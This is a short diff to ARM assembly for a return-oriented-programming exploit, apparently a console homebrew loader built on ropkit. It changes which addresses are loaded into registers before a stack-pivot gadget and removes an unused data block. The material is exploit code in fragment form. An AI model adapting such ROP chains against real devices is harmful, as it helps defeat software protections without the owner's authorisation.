@@ -23,9 +23,9 @@ _start:
 
 .macro ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP
 .word POP_R4R5R6PC
-.word ROPBUFLOC(pivotdata+0x34) @ r4
+.word ROPBUFLOC(stackpivot_pcloadword+4) @ r4
 .word 0 @ r5
-.word ROPBUFLOC(pivotdata+0x34) @ r6
+.word ROPBUFLOC(stackpivot_pcloadword+4) @ r6
 .endm
 
 .macro ROPMACRO_STACKPIVOT_JUMP
@@ -52,9 +52,6 @@ ROPMACRO_STACKPIVOT_JUMP
 
 ropstackstart:
 #include "ropkit_boototherapp.s"
-
-pivotdata:
-.word 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
 
 stackpivot_sploadword:
 .word ROPBUFLOC(ropstackstart)
